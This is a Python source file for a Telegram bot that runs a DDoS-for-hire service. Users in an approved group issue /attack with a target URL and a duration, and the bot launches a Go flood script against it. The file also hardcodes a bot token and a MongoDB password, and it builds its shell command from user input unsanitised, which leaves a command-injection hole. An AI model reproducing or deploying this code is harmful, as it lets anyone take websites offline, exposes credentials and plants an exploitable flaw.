import os
import subprocess
import time
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, CallbackContext
from pymongo import MongoClient

# Configuration
BOT_TOKEN = "7417294211:AAHZ00Z6xiSP-m2KHEQYZGnN4Sl8fox3aWk"
OWNER_IDS = [5606990991, 5460343986]
MONGO_URL = "mongodb+srv://mpjmu808gh:8sqqX0ERW0IMtviu@cluster0.zo6rkop.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
CHANNELS = ["@Falcon_Security", "@Pbail_Squad", "@Found_Us", "@Bot_Colony"]
ALLOWED_GROUP_ID = -1002239204465
LOG_GROUP_ID = -1002155266073

# MongoDB Client Setup
client = MongoClient(MONGO_URL)
db = client["bot_db"]
blacklist_collection = db["blacklist"]
stats_collection = db["stats"]

# Global Variables
active_attacks = {}

# Log Function
async def log_activity(message):
    await app.bot.send_message(LOG_GROUP_ID, message)

# Check if user is blacklisted
def is_blacklisted(user_id):
    return blacklist_collection.find_one({"user_id": user_id}) is not None

# Check if message is from allowed group
def is_allowed_group(update):
    if update.message:
        return update.message.chat_id == ALLOWED_GROUP_ID
    return False

# Start Command
async def start(update: Update, context: CallbackContext):
    if update.message.chat.type == 'private':
        await update.message.reply_text(
            "You need to join the group to use this bot. Please join using the link below:\n"
            "https://t.me/Free_DDos_Network\n\n"
            "After joining, you can start interacting with the bot in this chat."
        )
        return

    if not is_allowed_group(update):
        return

    buttons = [
        [InlineKeyboardButton("Falcon Security", url="https://t.me/Falcon_Security"),
         InlineKeyboardButton("Pbail Squad", url="https://t.me/Pbail_Squad")],
        [InlineKeyboardButton("Indian Hacker", url="https://t.me/Found_Us"),
         InlineKeyboardButton("Bot Colony", url="https://t.me/Bot_colony")],
        [InlineKeyboardButton("Verify", callback_data="verify")]
    ]
    keyboard = InlineKeyboardMarkup(buttons)
    await update.message.reply_text(
        "Welcome! Please join all the required channels to use the bot.", reply_markup=keyboard
    )

# Verify Callback Query Handler
async def verify(update: Update, context: CallbackContext):
    query = update.callback_query

    if query:
        chat_id = query.message.chat.id

        if chat_id != ALLOWED_GROUP_ID:
            await query.answer("You are not allowed to use this command in this group.")
            return

        user_id = query.from_user.id

        try:
            all_verified = True
            for channel in CHANNELS:
                try:
                    member = await context.bot.get_chat_member(channel, user_id)
                    if member.status not in ['member', 'administrator', 'creator']:
                        all_verified = False
                        break
                except Exception as e:
                    all_verified = False
                    print(f"Error checking channel membership for {channel}: {e}")
                    break

            if all_verified:
                await query.edit_message_text("Verification successful! You can now use the bot.\n\n"
                                              "To attack a site, use the command:\n/attack {url} {time in seconds}\n\n"
                                              "Note: Maximum attack duration is 200 seconds. Only 2 attacks can run simultaneously.")
                await log_activity(f"User {user_id} has been verified successfully.")
            else:
                await query.edit_message_text("Please join all required channels first.")
        except Exception as e:
            print(f"Error in verification: {e}")
            await query.answer("An error occurred during verification. Please try again later.")

# Attack Command
async def attack(update: Update, context: CallbackContext):
    if not is_allowed_group(update):
        await update.message.reply_text(f"Please join the group to use the bot: https://t.me/joinchat/{ALLOWED_GROUP_ID}")
        return

    user_id = update.message.from_user.id
    if is_blacklisted(user_id):
        await update.message.reply_text("You are blacklisted and cannot use this bot.")
        return

    if len(active_attacks) >= 2:
        remaining_times = [data['remaining'] for data in active_attacks.values()]
        min_remaining = min(remaining_times)
        await update.message.reply_text(f"Two attacks are currently in progress. Please wait.\n"
                                        f"Time left for current attacks: {min_remaining} seconds.")
        return

    try:
        url = context.args[0]
        duration = int(context.args[1])
        if duration > 200:
            duration = 200
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /attack <url> <duration>")
        return

    attack_id = str(user_id) + "_" + str(int(time.time()))
    active_attacks[attack_id] = {"url": url, "remaining": duration}

    # Notify user that attack has started
    buttons = [
        [InlineKeyboardButton("Check Status", callback_data=f"check_status_{attack_id}")]
    ]
    keyboard = InlineKeyboardMarkup(buttons)
    await update.message.reply_text(f"Attack on {url} started for {duration} seconds.", reply_markup=keyboard)

    # Schedule the attack
    asyncio.create_task(execute_attack(attack_id, update))

# Execute Attack Function
async def execute_attack(attack_id, update):
    attack_data = active_attacks[attack_id]
    url, duration = attack_data["url"], attack_data["remaining"]
    command = f"go run flood.go {url}  {duration}"

    try:
        subprocess.run(command, shell=True, check=True)
        # Notify user of completion
        await update.message.reply_text(f"Attack on {url} completed.")
        await log_activity(f"User {update.message.from_user.id} completed an attack on {url} for {duration} seconds.")
    except subprocess.CalledProcessError:
        await update.message.reply_text("Failed to start the attack.")
    finally:
        del active_attacks[attack_id]

# Check Status Callback Query Handler
async def check_status(update: Update, context: CallbackContext):
    query = update.callback_query
    if query:
        attack_id = query.data.split("_", 2)[2]
        if attack_id in active_attacks:
            attack_data = active_attacks[attack_id]
            url = attack_data["url"]
            status_message = f"Current status for attack on {url}:\nRemaining time: {attack_data['remaining']} seconds."
        else:
            status_message = "No ongoing attack found for this ID."

        await query.edit_message_text(status_message)

# Owner Commands
async def blacklist(update: Update, context: CallbackContext):
    if update.message and update.message.from_user.id in OWNER_IDS:
        try:
            user_id = int(context.args[0])
        except (IndexError, ValueError):
            await update.message.reply_text("Usage: /Blacklist <user_id>")
            return

        blacklist_collection.insert_one({"user_id": user_id})
        await update.message.reply_text(f"User {user_id} has been blacklisted.")
        await log_activity(f"User {user_id} has been blacklisted by {update.message.from_user.id}.")

async def rm_blacklist(update: Update, context: CallbackContext):
    if update.message and update.message.from_user.id in OWNER_IDS:
        try:
            user_id = int(context.args[0])
        except (IndexError, ValueError):
            await update.message.reply_text("Usage: /rmBlacklist <user_id>")
            return

        blacklist_collection.delete_one({"user_id": user_id})
        await update.message.reply_text(f"User {user_id} has been removed from the blacklist.")
        await log_activity(f"User {user_id} has been removed from the blacklist by {update.message.from_user.id}.")

async def stats(update: Update, context: CallbackContext):
    if update.message and update.message.from_user.id in OWNER_IDS:
        total_users = stats_collection.estimated_document_count()
        active_users = len(active_attacks)
        await update.message.reply_text(f"Total users: {total_users}\nActive attacks: {active_users}")

async def broadcast(update: Update, context: CallbackContext):
    if update.message and update.message.from_user.id in OWNER_IDS:
        message = update.message.reply_to_message.text if update.message.reply_to_message else " ".join(context.args)
        users = stats_collection.find({})
        for user in users:
            try:
                await context.bot.send_message(chat_id=user["user_id"], text=message)
            except:
                pass

        await update.message.reply_text("Message broadcasted.")

# Error Handling
async def error_handler(update: Update, context: CallbackContext):
    print(f"Update {update} caused error {context.error}")

# Setup Application
app = Application.builder().token(BOT_TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(verify, pattern="verify"))
app.add_handler(CommandHandler("attack", attack))
app.add_handler(CommandHandler("Blacklist", blacklist))
app.add_handler(CommandHandler("rmBlacklist", rm_blacklist))
app.add_handler(CommandHandler("Stats", stats))
app.add_handler(CommandHandler("Broadcast", broadcast))
app.add_handler(CallbackQueryHandler(check_status, pattern="check_status_"))
app.add_error_handler(error_handler)

# Start the Bot
if __name__ == "__main__":
    app.run_polling()
